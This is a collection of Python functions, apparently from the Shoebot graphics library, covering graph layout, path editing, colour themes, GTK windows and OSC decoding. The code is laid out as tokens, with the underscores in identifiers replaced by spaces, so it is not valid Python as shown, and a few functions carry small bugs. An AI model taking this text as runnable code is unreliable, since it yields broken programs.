def create ( iterations = 1000 , distance = 1.0 , layout = LAYOUT SPRING , depth = True ) : #global  ctx ctx . colormode ( ctx . RGB ) g = graph ( iterations , distance , layout ) # Styles for different types of nodes. s = style . style g . styles . append ( s ( style . LIGHT , ctx , fill = ctx . color ( 0.0 , 0.0 , 0.0 , 0.20 ) ) ) g . styles . append ( s ( style . DARK , ctx , fill = ctx . color ( 0.3 , 0.5 , 0.7 , 0.75 ) ) ) g . styles . append ( s ( style . BACK , ctx , fill = ctx . color ( 0.5 , 0.8 , 0.0 , 0.50 ) ) ) g . styles . append ( s ( style . IMPORTANT , ctx , fill = ctx . color ( 0.3 , 0.6 , 0.8 , 0.75 ) ) ) g . styles . append ( s ( style . HIGHLIGHT , ctx , stroke = ctx . color ( 1.0 , 0.0 , 0.5 ) , strokewidth = 1.5 ) ) g . styles . append ( s ( style . MARKED , ctx ) ) g . styles . append ( s ( style . ROOT , ctx , text = ctx . color ( 1.0 , 0.0 , 0.4 , 1.00 ) , stroke = ctx . color ( 0.8 , 0.8 , 0.8 , 0.60 ) , strokewidth = 1.5 , fontsize = 16 , textwidth = 150 ) ) # Important nodes get a double stroke. def important node ( s , node , alpha = 1.0 ) : style . style ( None , ctx ) . node ( s , node , alpha ) r = node . r * 1.4 ctx . nofill ( ) ctx . oval ( node . x - r , node . y - r , r * 2 , r * 2 ) # Marked nodes have an inner dot. def marked node ( s , node , alpha = 1.0 ) : style . style ( None , ctx ) . node ( s , node , alpha ) r = node . r * 0.3 ctx . fill ( s . stroke ) ctx . oval ( node . x - r , node . y - r , r * 2 , r * 2 ) g . styles . important . node = important node g . styles . marked . node = marked node g . styles . depth = depth # Styling guidelines. All nodes have the default style, except: # 1) a node directly connected to the root gets the LIGHT style. # 2) a node with more than 4 edges gets the DARK style. # 3) a node with a weight of 0.75-1.0 gets the IMPORTANT style. # 4) the graph.root node gets the ROOT style. # 5) the node last clicked gets the BACK style.     g . styles . guide . append ( style . LIGHT , lambda graph , node : graph . root in node . links ) g . styles . guide . append ( style . DARK , lambda graph , node : len ( node . links ) > 4 ) g . styles . guide . append ( style . IMPORTANT , lambda graph , node : node . weight > 0.75 ) g . styles . guide . append ( style . ROOT , lambda graph , node : node == graph . root ) g . styles . guide . append ( style . BACK , lambda graph , node : node == graph . events . clicked ) # An additional rule applies every node's weight to its radius. def balance ( graph , node ) : node . r = node . r * 0.75 + node . r * node . weight * 0.75 g . styles . guide . append ( "balance" , balance ) # An additional rule that keeps leaf nodes closely clustered. def cluster ( graph , node ) : if len ( node . links ) == 1 : node . links . edge ( node . links [ 0 ] ) . length *= 0.5 g . styles . guide . append ( "cluster" , cluster ) g . styles . guide . order = [ style . LIGHT , style . DARK , style . IMPORTANT , style . ROOT , style . BACK , "balance" , "nurse" ] return g
def clear ( self ) : dict . clear ( self ) self . nodes = [ ] self . edges = [ ] self . root = None self . layout . i = 0 self . alpha = 0
def add node ( self , id , radius = 8 , style = style . DEFAULT , category = "" , label = None , root = False , properties = { } ) : if self . has key ( id ) : return self [ id ] if not isinstance ( style , str ) and style . dict . has key [ "name" ] : style = style . name n = node ( self , id , radius , style , category , label , properties ) self [ n . id ] = n self . nodes . append ( n ) if root : self . root = n return n
def remove node ( self , id ) : if self . has key ( id ) : n = self [ id ] self . nodes . remove ( n ) del self [ id ] # Remove all edges involving id and all links to it. for e in list ( self . edges ) : if n in ( e . node1 , e . node2 ) : if n in e . node1 . links : e . node1 . links . remove ( n ) if n in e . node2 . links : e . node2 . links . remove ( n ) self . edges . remove ( e )
def remove edge ( self , id1 , id2 ) : for e in list ( self . edges ) : if id1 in ( e . node1 . id , e . node2 . id ) and id2 in ( e . node1 . id , e . node2 . id ) : e . node1 . links . remove ( e . node2 ) e . node2 . links . remove ( e . node1 ) self . edges . remove ( e )
def edge ( self , id1 , id2 ) : if id1 in self and id2 in self and self [ id2 ] in self [ id1 ] . links : return self [ id1 ] . links . edge ( id2 ) return None
def update ( self , iterations = 10 ) : # The graph fades in when initially constructed. self . alpha += 0.05 self . alpha = min ( self . alpha , 1.0 ) # Iterates over the graph's layout. # Each step the graph's bounds are recalculated # and a number of iterations are processed, # more and more as the layout progresses. if self . layout . i == 0 : self . layout . prepare ( ) self . layout . i += 1 elif self . layout . i == 1 : self . layout . iterate ( ) elif self . layout . i < self . layout . n : n = min ( iterations , self . layout . i / 10 + 1 ) for i in range ( n ) : self . layout . iterate ( ) # Calculate the absolute center of the graph. min , max = self . layout . bounds self . x = ctx . WIDTH - max . x * self . d - min . x * self . d self . y = ctx . HEIGHT - max . y * self . d - min . y * self . d self . x /= 2 self . y /= 2 return not self . layout . done
def offset ( self , node ) : x = self . x + node . x - ctx . WIDTH / 2 y = self . y + node . y - ctx . HEIGHT / 2 return x , y
def prune ( self , depth = 0 ) : for n in list ( self . nodes ) : if len ( n . links ) <= depth : self . remove node ( n . id )
def nodes by category ( self , category ) : return [ n for n in self . nodes if n . category == category ]
def crown ( self , depth = 2 ) : nodes = [ ] for node in self . leaves : nodes += node . flatten ( depth - 1 ) return cluster . unique ( nodes )
def density ( self ) : return 2.0 * len ( self . edges ) / ( len ( self . nodes ) * ( len ( self . nodes ) - 1 ) )
def load ( self , id ) : self . clear ( ) # Root node. self . add node ( id , root = True ) # Directly connected nodes have priority. for w , id2 in self . get links ( id ) : self . add edge ( id , id2 , weight = w ) if len ( self ) > self . max : break # Now get all the other nodes in the cluster. for w , id2 , links in self . get cluster ( id ) : for id3 in links : self . add edge ( id3 , id2 , weight = w ) self . add edge ( id , id3 , weight = w ) #if len(links) == 0: #    self.add edge(id, id2) if len ( self ) > self . max : break # Provide a backlink to the previous root. if self . event . clicked : g . add node ( self . event . clicked )
def click ( self , node ) : if not self . has node ( node . id ) : return if node == self . root : return self . dx , self . dy = self . offset ( node ) self . previous = self . root . id self . load ( node . id )
def angle ( x1 , y1 , x2 , y2 ) : sign = 1.0 usign = ( x1 * y2 - y1 * x2 ) if usign < 0 : sign = - 1.0 num = x1 * x2 + y1 * y2 den = hypot ( x1 , y1 ) * hypot ( x2 , y2 ) ratio = min ( max ( num / den , - 1.0 ) , 1.0 ) return sign * degrees ( acos ( ratio ) )
def transform from local ( xp , yp , cphi , sphi , mx , my ) : x = xp * cphi - yp * sphi + mx y = xp * sphi + yp * cphi + my return ( x , y )
def create view ( self , name = "shoebot-output" ) : view = Gtk . Text View ( ) view . set editable ( False ) fontdesc = Pango . Font Description ( "Monospace" ) view . modify font ( fontdesc ) view . set name ( name ) buff = view . get buffer ( ) buff . create tag ( 'error' , foreground = 'red' ) return view
def set bot ( self , bot ) : self . bot = bot self . sink . set bot ( bot )
def settings ( self , * * kwargs ) : for k , v in kwargs . items ( ) : setattr ( self , k , v )
def flush ( self , frame ) : self . sink . render ( self . size or default ( ) , frame , self . drawqueue ) self . reset drawqueue ( )
def reflect ( self , x0 , y0 , x , y ) : rx = x0 - ( x - x0 ) ry = y0 - ( y - y0 ) return rx , ry
def angle ( self , x0 , y0 , x1 , y1 ) : a = degrees ( atan ( ( y1 - y0 ) / ( x1 - x0 + 0.00001 ) ) ) + 360 if x1 - x0 < 0 : a += 180 return a
def coordinates ( self , x0 , y0 , distance , angle ) : x = x0 + cos ( radians ( angle ) ) * distance y = y0 + sin ( radians ( angle ) ) * distance return Point ( x , y )
def contains point ( self , x , y , d = 2 ) : if self . path != None and len ( self . path ) > 1 and self . path . contains ( x , y ) : # If all points around the mouse are also part of the path, # this means we are somewhere INSIDE the path. # Only points near the edge (i.e. on the outline stroke) # should propagate. if not self . path . contains ( x + d , y ) or not self . path . contains ( x , y + d ) or not self . path . contains ( x - d , y ) or not self . path . contains ( x , y - d ) or not self . path . contains ( x + d , y + d ) or not self . path . contains ( x - d , y - d ) or not self . path . contains ( x + d , y - d ) or not self . path . contains ( x - d , y + d ) : return True return False
def draw ( self ) : # Enable interaction. self . update ( ) x , y = mouse ( ) # Snap to grid when enabled. # The grid is enabled with the TAB key. if self . show grid : self . grid . draw ( ) x , y = self . grid . snap ( x , y ) ctx . strokewidth ( self . strokewidth ) if self . freehand : self . draw freehand ( ) r = 4 ctx . nofill ( ) if len ( self . points ) > 0 : first = True for i in range ( len ( self . points ) ) : # Construct the path. pt = self . points [ i ] if first : ctx . beginpath ( pt . x , pt . y ) first = False else : if pt . cmd == CLOSE : ctx . closepath ( ) elif pt . cmd == MOVETO : ctx . moveto ( pt . x , pt . y ) elif pt . cmd == LINETO : ctx . lineto ( pt . x , pt . y ) elif pt . cmd == CURVETO : ctx . curveto ( pt . ctrl1 . x , pt . ctrl1 . y , pt . ctrl2 . x , pt . ctrl2 . y , pt . x , pt . y ) # In add- or edit-mode, # display the current point's handles. if ( ( i == self . edit and self . new == None ) or pt == self . new ) and pt . cmd == CURVETO and not pt . freehand : ctx . stroke ( self . handle color ) ctx . nofill ( ) ctx . oval ( pt . x - r , pt . y - r , r * 2 , r * 2 ) ctx . stroke ( self . handle color ) ctx . line ( pt . ctrl2 . x , pt . ctrl2 . y , pt . x , pt . y ) ctx . fill ( self . handle color ) # Display the new point's handle being dragged. if pt == self . new and not pt . freehand : rx , ry = self . reflect ( pt . x , pt . y , pt . ctrl2 . x , pt . ctrl2 . y ) ctx . stroke ( self . handle color ) ctx . line ( rx , ry , pt . x , pt . y ) ctx . nostroke ( ) ctx . fill ( self . handle color ) ctx . oval ( rx - r / 2 , ry - r / 2 , r , r ) # Display handles for point being edited. if i == self . edit and self . new == None and pt . cmd == CURVETO and not pt . freehand : ctx . oval ( pt . ctrl2 . x - r / 2 , pt . ctrl2 . y - r / 2 , r , r ) if i > 0 : prev = self . points [ i - 1 ] ctx . line ( pt . ctrl1 . x , pt . ctrl1 . y , prev . x , prev . y ) ctx . oval ( pt . ctrl1 . x - r / 2 , pt . ctrl1 . y - r / 2 , r , r ) if i > 0 and self . points [ i - 1 ] . cmd != MOVETO : ctx . line ( prev . ctrl2 . x , prev . ctrl2 . y , prev . x , prev . y ) if i < len ( self . points ) - 1 : next = self . points [ i + 1 ] if next . cmd == CURVETO : ctx . line ( next . ctrl1 . x , next . ctrl1 . y , pt . x , pt . y ) # When hovering over a point, # highlight it. elif self . overlap ( x , y , pt . x , pt . y ) and not pt . freehand : self . insert = False # quit insert mode ctx . nofill ( ) ctx . stroke ( self . handle color ) ctx . oval ( pt . x - r , pt . y - r , r * 2 , r * 2 ) # Provide visual coordinates # for points being dragged, moved or hovered. ctx . fontsize ( 9 ) ctx . fill ( self . handle color ) txt = " (" + str ( int ( pt . x ) ) + ", " + str ( int ( pt . y ) ) + ")" if ( i == self . edit and self . new == None ) or pt == self . new and not pt . freehand : ctx . text ( txt , pt . x + r , pt . y + 2 ) elif self . overlap ( x , y , pt . x , pt . y ) and not pt . freehand : ctx . text ( txt , pt . x + r , pt . y + 2 ) # Draw a circle for each point # in the path. if not pt . freehand : if pt . cmd != MOVETO : ctx . fill ( self . path color ) ctx . nostroke ( ) else : ctx . stroke ( self . path color ) ctx . nofill ( ) ctx . oval ( pt . x - r / 2 , pt . y - r / 2 , r , r ) # Draw the current path, # update the path property. ctx . stroke ( self . path color ) ctx . fill ( self . path fill ) ctx . autoclosepath ( False ) p = ctx . endpath ( ) self . path = p # Possible to insert a point here. if self . insert : ctx . stroke ( self . handle color ) ctx . nofill ( ) ctx . oval ( x - r * 0.8 , y - r * 0.8 , r * 1.6 , r * 1.6 ) # When not editing a node, # prospect how the curve will continue # when adding a new point. if self . edit == None and self . new == None and self . moveto != True and not self . freehand : ctx . nofill ( ) ctx . stroke ( self . new color ) rx , ry = self . reflect ( pt . x , pt . y , pt . ctrl2 . x , pt . ctrl2 . y ) ctx . beginpath ( pt . x , pt . y ) ctx . curveto ( rx , ry , x , y , x , y ) ctx . endpath ( ) # A dashed line indicates what # a CLOSETO would look like. if self . last moveto != None : start = self . last moveto else : start = self . points [ 0 ] p = ctx . line ( x , y , start . x , start . y , draw = False ) try : p . ns Bezier Path . set Line Dash count phase ( [ 2 , 4 ] , 2 , 50 ) except : pass ctx . drawpath ( p ) # When doing a MOVETO, # show the new point hovering at the mouse location. elif self . edit == None and self . new == None and self . moveto != None : ctx . stroke ( self . new color ) ctx . nofill ( ) ctx . oval ( x - r * 0.8 , y - r * 0.8 , r * 1.6 , r * 1.6 ) # Draws button for a point being edited. # The first button deletes the point. # The second button, which appears only on the last point # in the path, tells the editor to perform a MOVETO # before adding a new point. if self . edit != None : pt = self . points [ self . edit ] x = pt . x + self . btn x y = pt . y + self . btn y r = self . btn r ctx . nostroke ( ) ctx . fill ( 0 , 0 , 0 , 0.2 ) ctx . fill ( self . handle color ) ctx . oval ( x - r , y - r , r * 2 , r * 2 ) ctx . fill ( 1 ) ctx . rotate ( 45 ) ctx . rect ( x - r + 2 , y - 0.625 , r + 1 , 1.25 ) ctx . rotate ( - 90 ) ctx . rect ( x - r + 2 , y - 0.625 , r + 1 , 1.25 ) ctx . reset ( ) if self . edit == len ( self . points ) - 1 : ctx . fill ( self . handle color ) ctx . oval ( x + r * 2 + 2 - r , y - r , r * 2 , r * 2 ) ctx . fill ( 1 ) ctx . rect ( x + r * 2 + 2 - 2.25 , y - r + 3 , 1.5 , r - 1 ) ctx . rect ( x + r * 2 + 2 + 0.75 , y - r + 3 , 1.5 , r - 1 ) # Handle onscreen notifications. # Any text in msg is displayed in a box in the center # and slowly fades away, after which msg is cleared.     if self . msg != "" : self . msg alpha -= 0.1 ctx . nostroke ( ) ctx . fill ( 0 , 0 , 0 , self . msg alpha ) ctx . fontsize ( 18 ) ctx . lineheight ( 1 ) w = ctx . textwidth ( self . msg ) ctx . rect ( ctx . WIDTH / 2 - w / 2 - 9 , ctx . HEIGHT / 2 - 27 , w + 18 , 36 , roundness = 0.4 ) ctx . fill ( 1 , 1 , 1 , 0.8 ) ctx . align ( CENTER ) ctx . text ( self . msg , 0 , ctx . HEIGHT / 2 , width = ctx . WIDTH ) if self . msg alpha <= 0.0 : self . msg = "" self . msg alpha = 1.0
def gtk mouse button down ( self , widget , event ) : if self . menu enabled and event . button == 3 : menu = self . uimanager . get widget ( '/Save as' ) menu . popup ( None , None , None , None , event . button , event . time ) else : super ( Shoebot Window , self ) . gtk mouse button down ( widget , event )
def show variables window ( self ) : if self . var window is None and self . bot . vars : self . var window = Var Window ( self , self . bot , '%s variables' % ( self . title or 'Shoebot' ) ) self . var window . window . connect ( "destroy" , self . var window closed )
def hide variables window ( self ) : if self . var window is not None : self . var window . window . destroy ( ) self . var window = None
def do fullscreen ( self , widget ) : self . fullscreen ( ) self . is fullscreen = True # next lines seem to be needed for window switching really to # fullscreen mode before reading it's size values while Gtk . events pending ( ) : Gtk . main iteration ( ) # we pass informations on full-screen size to bot self . bot . screen width = Gdk . Screen . width ( ) self . bot . screen height = Gdk . Screen . height ( ) self . bot . screen ratio = self . bot . screen width / self . bot . screen height
def do unfullscreen ( self , widget ) : self . unfullscreen ( ) self . is fullscreen = False self . bot . screen ratio = None
def do window close ( self , widget , data = None ) : publish event ( QUIT EVENT ) if self . has server : self . sock . close ( ) self . hide variables window ( ) self . destroy ( ) self . window open = False
def do toggle fullscreen ( self , action ) : is fullscreen = action . get active ( ) if is fullscreen : self . fullscreen ( ) else : self . unfullscreen ( )
def do toggle variables ( self , action ) : self . show vars = action . get active ( ) if self . show vars : self . show variables window ( ) else : self . hide variables window ( )
def mouse pointer moved ( self , x , y ) : self . namespace [ 'MOUSEX' ] = x self . namespace [ 'MOUSEY' ] = y
def key pressed ( self , key , keycode ) : self . namespace [ 'key' ] = key self . namespace [ 'keycode' ] = keycode self . namespace [ 'keydown' ] = True
def set callbacks ( self , * * kwargs ) : for name in self . SUPPORTED CALLBACKS : func = kwargs . get ( name , getattr ( self , name ) ) setattr ( self , name , func )
def complement ( clr ) : clr = color ( clr ) colors = colorlist ( clr ) colors . append ( clr . complement ) return colors
def right complement ( clr ) : right = split complementary ( clr ) [ 2 ] colors = complementary ( clr ) colors [ 3 ] . h = right . h colors [ 4 ] . h = right . h colors [ 5 ] . h = right . h colors = colorlist ( colors [ 0 ] , colors [ 2 ] , colors [ 1 ] , colors [ 5 ] , colors [ 4 ] , colors [ 3 ] ) return colors
def compound ( clr , flip = False ) : def wrap ( x , min , threshold , plus ) : if x - min < threshold : return x + plus else : return x - min d = 1 if flip : d = - 1 clr = color ( clr ) colors = colorlist ( clr ) c = clr . rotate ryb ( 30 * d ) c . brightness = wrap ( clr . brightness , 0.25 , 0.6 , 0.25 ) colors . append ( c ) c = clr . rotate ryb ( 30 * d ) c . saturation = wrap ( clr . saturation , 0.4 , 0.1 , 0.4 ) c . brightness = wrap ( clr . brightness , 0.4 , 0.2 , 0.4 ) colors . append ( c ) c = clr . rotate ryb ( 160 * d ) c . saturation = wrap ( clr . saturation , 0.25 , 0.1 , 0.25 ) c . brightness = max ( 0.2 , clr . brightness ) colors . append ( c ) c = clr . rotate ryb ( 150 * d ) c . saturation = wrap ( clr . saturation , 0.1 , 0.8 , 0.1 ) c . brightness = wrap ( clr . brightness , 0.3 , 0.6 , 0.3 ) colors . append ( c ) c = clr . rotate ryb ( 150 * d ) c . saturation = wrap ( clr . saturation , 0.1 , 0.8 , 0.1 ) c . brightness = wrap ( clr . brightness , 0.4 , 0.2 , 0.4 ) # colors.append(c) return colors
def blend ( self , clr , factor = 0.5 ) : r = self . r * ( 1 - factor ) + clr . r * factor g = self . g * ( 1 - factor ) + clr . g * factor b = self . b * ( 1 - factor ) + clr . b * factor a = self . a * ( 1 - factor ) + clr . a * factor return Color ( r , g , b , a , mode = "rgb" )
def swatch ( self , x , y , w = 35 , h = 35 , roundness = 0 ) : ctx . fill ( self ) ctx . rect ( x , y , w , h , roundness )
def copy ( self ) : return Color List ( [ color ( clr . r , clr . g , clr . b , clr . a , mode = "rgb" ) for clr in self ] , name = self . name , tags = self . tags )
def average ( self ) : r , g , b , a = 0 , 0 , 0 , 0 for clr in self : r += clr . r g += clr . g b += clr . b a += clr . alpha r /= len ( self ) g /= len ( self ) b /= len ( self ) a /= len ( self ) return color ( r , g , b , a , mode = "rgb" )
def sorted copy ( self , comparison , reversed = False ) : sorted = self . copy ( ) list . sort ( sorted , comparison ) if reversed : list . reverse ( sorted ) return sorted
def reverse ( self ) : colors = Color List . copy ( self ) list . reverse ( colors ) return colors
def swatch ( self , x , y , w = 35 , h = 35 , padding = 0 , roundness = 0 ) : for clr in self : clr . swatch ( x , y , w , h , roundness ) y += h + padding
def swarm ( self , x , y , r = 100 ) : sc = ctx . stroke ( 0 , 0 , 0 , 0 ) sw = ctx . strokewidth ( 0 ) ctx . push ( ) ctx . transform ( ctx . CORNER ) ctx . translate ( x , y ) for i in range ( r * 3 ) : clr = choice ( self ) . copy ( ) clr . alpha -= 0.5 * random ( ) ctx . fill ( clr ) clr = choice ( self ) ctx . stroke ( clr ) ctx . strokewidth ( 10 * random ( ) ) ctx . rotate ( 360 * random ( ) ) r2 = r * 0.5 * random ( ) ctx . oval ( r * random ( ) , 0 , r2 , r2 ) ctx . pop ( ) ctx . strokewidth ( sw ) if sc is None : ctx . nostroke ( ) else : ctx . stroke ( sc )
def interpolate ( self , colors , n = 100 ) : gradient = [ ] for i in range ( n ) : l = len ( colors ) - 1 x = int ( 1.0 * i / n * l ) x = min ( x + 0 , l ) y = min ( x + 1 , l ) base = 1.0 * n / l * x d = ( i - base ) / ( 1.0 * n / l ) r = colors [ x ] . r * ( 1 - d ) + colors [ y ] . r * d g = colors [ x ] . g * ( 1 - d ) + colors [ y ] . g * d b = colors [ x ] . b * ( 1 - d ) + colors [ y ] . b * d a = colors [ x ] . a * ( 1 - d ) + colors [ y ] . a * d gradient . append ( color ( r , g , b , a , mode = "rgb" ) ) gradient . append ( colors [ - 1 ] ) return gradient
def save ( self ) : if not os . path . exists ( self . cache ) : os . makedirs ( self . cache ) path = os . path . join ( self . cache , self . name + ".xml" ) f = open ( path , "w" ) f . write ( self . xml ) f . close ( )
def colors ( self , n = 10 , d = 0.035 ) : s = sum ( [ w for clr , rng , w in self . ranges ] ) colors = colorlist ( ) for i in range ( n ) : r = random ( ) for clr , rng , weight in self . ranges : if weight / s >= r : break r -= weight / s colors . append ( rng ( clr , d ) ) return colors
def recombine ( self , other , d = 0.7 ) : a , b = self , other d1 = max ( 0 , min ( d , 1 ) ) d2 = d1 c = Color Theme ( name = a . name [ : int ( len ( a . name ) * d1 ) ] + b . name [ int ( len ( b . name ) * d2 ) : ] , ranges = a . ranges [ : int ( len ( a . ranges ) * d1 ) ] + b . ranges [ int ( len ( b . ranges ) * d2 ) : ] , top = a . top , cache = os . path . join ( DEFAULT CACHE , "recombined" ) , blue = a . blue , length = a . length * d1 + b . length * d2 ) c . tags = a . tags [ : int ( len ( a . tags ) * d1 ) ] c . tags += b . tags [ int ( len ( b . tags ) * d2 ) : ] return c
def render closure ( self ) : fillcolor = self . fill strokecolor = self . stroke strokewidth = self . strokewidth def render ( cairo ctx ) : # Go to initial point (CORNER or CENTER): transform = self . call transform mode ( self . transform ) if fillcolor is None and strokecolor is None : # Fixes  bug Fill Stroke Nofill Nostroke.bot return cairo ctx . set matrix ( transform ) # Run the path commands on the cairo context: self . traverse ( cairo ctx ) # Matrix affects stroke, so we need to reset it: cairo ctx . set matrix ( cairo . Matrix ( ) ) if fillcolor is not None and strokecolor is not None : if strokecolor [ 3 ] < 1 : # Draw onto intermediate surface so that stroke # does not overlay fill cairo ctx . push group ( ) cairo ctx . set source rgba ( * fillcolor ) cairo ctx . fill preserve ( ) e = cairo ctx . stroke extents ( ) cairo ctx . set source rgba ( * strokecolor ) cairo ctx . set operator ( cairo . OPERATOR SOURCE ) cairo ctx . set line width ( strokewidth ) cairo ctx . stroke ( ) cairo ctx . pop group to source ( ) cairo ctx . paint ( ) else : # Fast path if no alpha in stroke cairo ctx . set source rgba ( * fillcolor ) cairo ctx . fill preserve ( ) cairo ctx . set source rgba ( * strokecolor ) cairo ctx . set line width ( strokewidth ) cairo ctx . stroke ( ) elif fillcolor is not None : cairo ctx . set source rgba ( * fillcolor ) cairo ctx . fill ( ) elif strokecolor is not None : cairo ctx . set source rgba ( * strokecolor ) cairo ctx . set line width ( strokewidth ) cairo ctx . stroke ( ) return render
def linelength ( self , x0 , y0 , x1 , y1 ) : # Originally from nodebox-gl a = pow ( abs ( x0 - x1 ) , 2 ) b = pow ( abs ( y0 - y1 ) , 2 ) return sqrt ( a + b )
def segment lengths ( self , relative = False , n = 20 ) : # From nodebox gl lengths = [ ] first = True for el in self . get elements ( ) : if first is True : close x , close y = el . x , el . y first = False elif el . cmd == MOVETO : close x , close y = el . x , el . y lengths . append ( 0.0 ) elif el . cmd == CLOSE : lengths . append ( self . linelength ( x0 , y0 , close x , close y ) ) elif el . cmd == LINETO : lengths . append ( self . linelength ( x0 , y0 , el . x , el . y ) ) elif el . cmd == CURVETO : x3 , y3 , x1 , y1 , x2 , y2 = el . x , el . y , el . c1x , el . c1y , el . c2x , el . c2y # (el.c1x, el.c1y, el.c2x, el.c2y, el.x, el.y) lengths . append ( self . curvelength ( x0 , y0 , x1 , y1 , x2 , y2 , x3 , y3 , n ) ) if el . cmd != CLOSE : x0 = el . x y0 = el . y if relative : length = sum ( lengths ) try : # Relative segment lengths' sum is 1.0. return map ( lambda l : l / length , lengths ) except Zero Division Error : # If the length is zero, just return zero for all segments return [ 0.0 ] * len ( lengths ) else : return lengths
def get elements ( self ) : for index , el in enumerate ( self . elements ) : if isinstance ( el , tuple ) : el = Path Element ( * el ) self . elements [ index ] = el yield el
def description ( self ) : meta = self . find ( "meta" , { "name" : "description" } ) if isinstance ( meta , dict ) and meta . has key ( "content" ) : return meta [ "content" ] else : return u""
def keywords ( self ) : meta = self . find ( "meta" , { "name" : "keywords" } ) if isinstance ( meta , dict ) and meta . has key ( "content" ) : keywords = [ k . strip ( ) for k in meta [ "content" ] . split ( "," ) ] else : keywords = [ ] return keywords
def sorted ( list , cmp = None , reversed = False ) : list = [ x for x in list ] list . sort ( cmp ) if reversed : list . reverse ( ) return list
def unique ( list ) : unique = [ ] [ unique . append ( x ) for x in list if x not in unique ] return unique
def clique ( graph , id ) : clique = [ id ] for n in graph . nodes : friend = True for id in clique : if n . id == id or graph . edge ( n . id , id ) == None : friend = False break if friend : clique . append ( n . id ) return clique
def cliques ( graph , threshold = 3 ) : cliques = [ ] for n in graph . nodes : c = clique ( graph , n . id ) if len ( c ) >= threshold : c . sort ( ) if c not in cliques : cliques . append ( c ) return cliques
def hex Dump ( bytes ) : for i in range ( len ( bytes ) ) : sys . stdout . write ( "%2x " % ( ord ( bytes [ i ] ) ) ) if ( i + 1 ) % 8 == 0 : print repr ( bytes [ i - 7 : i + 1 ] ) if ( len ( bytes ) % 8 != 0 ) : print string . rjust ( "" , 11 ) , repr ( bytes [ i - len ( bytes ) % 8 : i + 1 ] )
def decode OSC ( data ) : table = { "i" : read Int , "f" : read Float , "s" : read String , "b" : read Blob } decoded = [ ] address , rest = read String ( data ) typetags = "" if address == "#bundle" : time , rest = read Long ( rest ) #       decoded.append(address) #       decoded.append(time) while len ( rest ) > 0 : length , rest = read Int ( rest ) decoded . append ( decode OSC ( rest [ : length ] ) ) rest = rest [ length : ] elif len ( rest ) > 0 : typetags , rest = read String ( rest ) decoded . append ( address ) decoded . append ( typetags ) if typetags [ 0 ] == "," : for tag in typetags [ 1 : ] : value , rest = table [ tag ] ( rest ) decoded . append ( value ) else : print "Oops, typetag lacks the magic ," return decoded
def dispatch ( self , message , source = None ) : msgtype = "" try : if type ( message [ 0 ] ) == str : # got a single message address = message [ 0 ] self . callbacks [ address ] ( message ) elif type ( message [ 0 ] ) == list : for msg in message : self . dispatch ( msg ) except Key Error , key : print 'address %s not found, %s: %s' % ( address , key , message ) pprint . pprint ( message ) except Index Error , e : print '%s: %s' % ( e , message ) pass except None , e : print "Exception in" , address , "callback :" , e return
def find example dir ( ) : # Replace %s with directory to check for shoebot menus. code stub = textwrap . dedent ( ) # Needs to run in same python env as shoebot (may be different to gedits) code = code stub % 'share/shoebot/examples' cmd = [ "python" , "-c" , code ] p = subprocess . Popen ( cmd , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) output , errors = p . communicate ( ) if errors : print ( 'Shoebot experienced errors searching for install and examples.' ) print ( 'Errors:\n{0}' . format ( errors . decode ( 'utf-8' ) ) ) return None else : examples dir = output . decode ( 'utf-8' ) . strip ( ) if os . path . isdir ( examples dir ) : return examples dir # If user is running 'setup.py develop' then examples could be right here #code = "from pkg resources import resource filename, Requirement; print resource filename(Requirement.parse('shoebot'), 'examples/')" code = code stub % 'examples/' cmd = [ "python" , "-c" , code ] p = subprocess . Popen ( cmd , stdout = subprocess . PIPE ) output , errors = p . communicate ( ) examples dir = output . decode ( 'utf-8' ) . strip ( ) if os . path . isdir ( examples dir ) : return examples dir if examples dir : print ( 'Shoebot could not find examples at: {0}' . format ( examples dir ) ) else : print ( 'Shoebot could not find install dir and examples.' )
def eof ( self ) : return ( not self . is alive ( ) ) and self . queue . empty ( ) or self . fd . closed
def close ( self ) : self . process . stdout . close ( ) self . process . stderr . close ( ) self . running = False
def get command responses ( self ) : if not self . response queue . empty ( ) : yield None while not self . response queue . empty ( ) : line = self . response queue . get ( ) if line is not None : yield line
def get center ( self ) : w , h = self . layout . get pixel size ( ) x = ( self . x + w / 2 ) y = ( self . y + h / 2 ) return x , y
def draw math ( str , x , y , alpha = 1.0 ) : try : from web import ctx except : pass str = re . sub ( "</{0,1}math>" , "" , str . strip ( ) ) img = mimetex . gif ( str ) w , h = ctx . imagesize ( img ) ctx . image ( img , x , y , alpha = alpha ) return w , h
def draw table ( table , x , y , w , padding = 5 ) : try : from web import ctx except : pass f = ctx . fill ( ) ctx . stroke ( f ) h = ctx . textheight ( " " ) + padding * 2 row y = y if table . title != "" : ctx . fill ( f ) ctx . rect ( x , row y , w , h ) ctx . fill ( 1 ) ctx . text ( table . title , x + padding , row y + ctx . fontsize ( ) + padding ) row y += h # A table of flags marking how long a cell  # from a previous row is still spanning in a column. rowspans = [ 1 for i in range ( 10 ) ] previous cell w = 0 for row in table : cell x = x # The width of a cell is the total table width  # evenly divided by the number of cells. # Previous rows' cells still spanning will push cells # to the right and decrease their width. cell w = 1.0 * w cell w -= previous cell w * len ( [ n for n in rowspans if n > 1 ] ) cell w /= len ( row ) # The height of each cell is the highest cell in the row. # The height depends on the amount of text in the cell. cell h = 0 for cell in row : this h = ctx . textheight ( cell , width = cell w - padding * 2 ) + padding * 2 cell h = max ( cell h , this h ) # Traverse each cell in this row. i = 0 for cell in row : # If a previous row's cell is still spanning, # push this cell to the right. if rowspans [ i ] > 1 : rowspans [ i ] -= 1 cell x += previous cell w i += 1 # Get the rowspan attribute for this cell. m = re . search ( "rowspan=\"(.*?)\"" , cell . properties ) if m : rowspan = int ( m . group ( 1 ) ) rowspans [ i ] = rowspan else : rowspan = 1 # Padded cell text.             # Horizontal line above each cell. # Vertical line before each cell. ctx . fill ( f ) ctx . text ( cell , cell x + padding , row y + ctx . fontsize ( ) + padding , cell w - padding * 2 ) ctx . line ( cell x , row y , cell x + cell w , row y ) if cell x > x : ctx . nofill ( ) ctx . line ( cell x , row y , cell x , row y + cell h ) cell x += cell w i += 1 # Move to next row. row y += cell h previous cell w = cell w # Table's bounding rectangle. ctx . nofill ( ) ctx . rect ( x , y , w , row y - y )
def sanitize ( self , val ) : if self . type == NUMBER : try : return clamp ( self . min , self . max , float ( val ) ) except Value Error : return 0.0 elif self . type == TEXT : try : return unicode ( str ( val ) , "utf 8" , "replace" ) except : return "" elif self . type == BOOLEAN : if unicode ( val ) . lower ( ) in ( "true" , "1" , "yes" ) : return True else : return False
